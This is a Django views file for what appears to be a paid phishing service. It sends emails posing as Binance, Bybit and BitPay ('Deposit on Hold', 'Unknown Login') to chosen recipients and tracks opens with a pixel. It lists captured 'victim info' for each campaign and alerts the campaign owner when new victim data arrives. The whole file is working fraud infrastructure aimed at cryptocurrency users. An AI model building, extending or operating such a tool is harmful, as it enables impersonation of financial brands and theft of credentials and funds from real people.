from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import EmailTemplate, Campaign, VictimInfo, EmailEvent, VictimEvent
from accounts.models import Profile
from .forms import CampaignForm
from django.contrib import messages
from payments.decorators import subscription_required
from payments.models import Subscription
from django.utils import timezone
from django.conf import settings
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.core.mail import send_mail, get_connection, EmailMultiAlternatives
from django.http import HttpResponse
import base64
import logging 
from django.urls import reverse
import uuid

logger = logging.getLogger(__name__)
# Create your views here.
TEMPLATE_MAPPING = {
    'binance_deposit': 'emails/binance_deposit.html',
    'binance_unknown': 'emails/binance_unknown.html',
    'bybit_deposit': 'emails/bybit_deposit.html',
    'bybit_unknown': 'emails/bybit_unknown.html',
    'bitpay_deposit': 'emails/bitpay_deposit.html',
    'bitpay_unknown': 'emails/bitpay_unknown.html',}


def index(request):
    """Render the index page."""
    return render(request, 'core/index.html')


@login_required
@subscription_required()
def create_campaign(request):
    if request.method == 'POST':
        form = CampaignForm(request.POST)
        if form.is_valid():
            campaign = form.save(commit=False)
            campaign.user = request.user
            
            # Check user's subscription
            subscription = Subscription.objects.filter(
                user=request.user,
                is_active=True,
                end_date__gt=timezone.now()
            ).first()

            if subscription and not subscription.has_reached_limit():
                try:
                    # Only save if email is sent successfully
                    tracking_id = send_campaign_email(campaign, request)
                    campaign.save()
                    # Now create EmailEvent
                    EmailEvent.objects.create(
                        campaign=campaign,
                        event_type='delivered',
                        recipient=campaign.recipient_email,
                        tracking_id=tracking_id
                    )
                    messages.success(request, 'Campaign created and email sent successfully!')

                except Exception as e:
                    logger.error(f"Failed to send email: {str(e)}")
                    messages.error(request, 'Email sending failed. Campaign was not created.')
                    return redirect('core:create_campaign')
                return redirect('core:campaign_list')  # Adjust URL name if needed
            else:
                messages.error(request, 'Monthly email limit reached or subscription inactive.')
                return redirect('payments:subscription_plans')
        else:
            # Form is invalid
            messages.error(request, 'Please correct the errors in the form.')
    else:
        form = CampaignForm()

    email_templates = EmailTemplate.objects.all()
    email_templates_data = []

    # Get active subscription info
    subscription = Subscription.objects.filter(
        user=request.user,
        is_active=True,
        end_date__gt=timezone.now()
    ).first()

    for template in email_templates:
        if subscription:
            email_templates_data.append({
                'id': template.id,
                'type': template.type,
                'max_emails': subscription.plan.max_emails,
            })

    return render(request, 'core/create_campaign.html', {
        'form': form,
        'email_templates': email_templates_data
    })

@login_required
def campaign_list(request):
    campaigns = Campaign.objects.filter(user=request.user)
    return render(request, 'core/campaign_list.html', {'campaigns': campaigns})

@login_required
def campaign_detail(request, pk):
    campaign = get_object_or_404(Campaign, pk=pk)
    # Get the latest email event for this campaign (delivered/opened/bounced)
    email_event = campaign.email_events.order_by('-timestamp').first()
    # Get the latest victim info for this campaign, if any
    victim_info = campaign.victim_infos.order_by('-created_at').first()
    return render(request, 'core/campaign_detail.html', {
        'campaign': campaign,
        'email_event': email_event,
        'victim_info': victim_info,
    })



#########################################EMAIL SENDING UTILS#########################################

from .utils import send_email_with_smtp

def send_campaign_email(campaign, request):
    """
    Send the campaign email to the recipient using the appropriate template.
    Adds a tracking pixel for open tracking.
    Returns the tracking_id used for this email.
    """
    receipient_email = campaign.recipient_email
    tracking_id = str(uuid.uuid4())
    # Use SITE_DOMAIN from settings to build the tracking pixel URL
    site_domain = getattr(settings, 'SITE_DOMAIN', None)
    if not site_domain:
        raise ValueError('SITE_DOMAIN is not set in settings.')
    tracking_pixel_url = f"{site_domain}{reverse('core:tracking_pixel', args=[campaign.id])}?recipient={receipient_email}&tracking_id={tracking_id}"
    context = {
        'campaign_id': campaign.id,
        'tracking_pixel_url': tracking_pixel_url,
    }

    template_type = campaign.email_template.type
    template_path = TEMPLATE_MAPPING.get(template_type)

    if not template_path:
        raise ValueError(f"No template found for type: {template_type}")
    
    # Define subject based on template type
    if template_type == 'binance_deposit':
        subject = 'Binance Deposit on Hold'
    elif template_type == 'binance_unknown':
        subject = 'Binance Unknown Login'
    elif template_type == 'bybit_deposit':
        subject = 'Bybit Deposit on Hold'
    elif template_type == 'bybit_unknown':
        subject = 'Bybit Unknown Login'
    elif template_type == 'bitpay_deposit':
        subject = 'BitPay Deposit on Hold'
    elif template_type == 'bitpay_unknown':
        subject = 'BitPay Unknown Login'
    else:
        subject = 'Notification'

    # Render the email body
    html_message = render_to_string(template_path, context)
    plain_message = strip_tags(html_message)

        # Set specific SMTP settings based on the campaign type
    smtp_settings = settings.CAMPAIGN_EMAIL_BACKENDS.get(template_type)
    from_email = smtp_settings.get('DEFAULT_FROM_EMAIL', smtp_settings['EMAIL_HOST_USER'])

    if smtp_settings:
        # Map Django settings keys to get_connection kwargs
        connection_kwargs = {
            'backend': 'django.core.mail.backends.smtp.EmailBackend',
            'host': smtp_settings.get('EMAIL_HOST'),
            'port': smtp_settings.get('EMAIL_PORT'),
            'username': smtp_settings.get('EMAIL_HOST_USER'),
            'password': smtp_settings.get('EMAIL_HOST_PASSWORD'),
            'use_ssl': smtp_settings.get('EMAIL_USE_SSL', False),
            'use_tls': smtp_settings.get('EMAIL_USE_TLS', False),
            'fail_silently': True,
        }
        with get_connection(**connection_kwargs) as connection:
            send_mail(
                subject,
                plain_message,
                from_email,
                [receipient_email],
                html_message=html_message,
                connection=connection
            )
            logger.info(f"Email successfully sent to {receipient_email} using {template_type} SMTP.")
    else:
        logger.error(f"No SMTP settings found for template type: {template_type}")
    return tracking_id

def send_victim_info_notification(campaign, victim_info, request=None):
    """
    Send an HTML email to the campaign owner when victim info is started/updated.
    Uses Django's send_mail with html_message, just like send_campaign_email.
    """
    from django.template.loader import render_to_string
    from django.utils.html import strip_tags
    from django.core.mail import send_mail
    from django.conf import settings
    from django.urls import reverse

    user = campaign.user
    subject = f"Victim Info Started for Campaign {campaign}"
    # Build campaign detail link if request is available
    if request:
        campaign_link = request.build_absolute_uri(reverse('core:campaign_detail', args=[campaign]))
    else:
        campaign_link = None
    context = {
        'campaign': campaign,
        'victim_info': victim_info,
        'campaign_link': campaign_link,
    }
    html_message = render_to_string('emails/victim_info_notification.html', context)
    plain_message = strip_tags(html_message)
    from_email = settings.DEFAULT_FROM_EMAIL
    recipient_list = [user.email]
    send_mail(
        subject,
        plain_message,
        from_email,
        recipient_list,
        html_message=html_message,
        fail_silently=True
    )

################################## Get Victim Info ##################################
@login_required
def view_victim_info(request):
    """
    Display all VictimInfo entries for the current user's campaigns.
    """
    victim_infos = VictimInfo.objects.filter(campaign__user=request.user).select_related('campaign').order_by('-created_at')
    return render(request, 'core/victim_info_list.html', {'victim_infos': victim_infos})

@login_required
def campaign_victims(request, campaign_id):
    """
    Display all VictimInfo entries for a specific campaign (only if the user owns the campaign).
    """
    campaign = get_object_or_404(Campaign, id=campaign_id, user=request.user)
    victim_infos = VictimInfo.objects.filter(campaign=campaign).order_by('-created_at')
    return render(request, 'core/campaign_victims.html', {
        'campaign': campaign,
        'victim_infos': victim_infos
    })

def tracking_pixel(request, campaign_id):
    """
    Endpoint for email open tracking pixel. Logs an 'open' event in EmailEvent.
    Returns a 1x1 transparent GIF.
    """
    recipient = request.GET.get('recipient')
    tracking_id = request.GET.get('tracking_id')
    campaign = get_object_or_404(Campaign, id=campaign_id)
    if recipient and tracking_id:
        # Log the open event (if not already logged for this tracking_id)
        EmailEvent.objects.get_or_create(
            campaign=campaign,
            event_type='open',
            recipient=recipient,
            tracking_id=tracking_id
        )
    # 1x1 transparent GIF
    gif_base64 = b'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=='
    gif_data = base64.b64decode(gif_base64)
    return HttpResponse(gif_data, content_type='image/gif')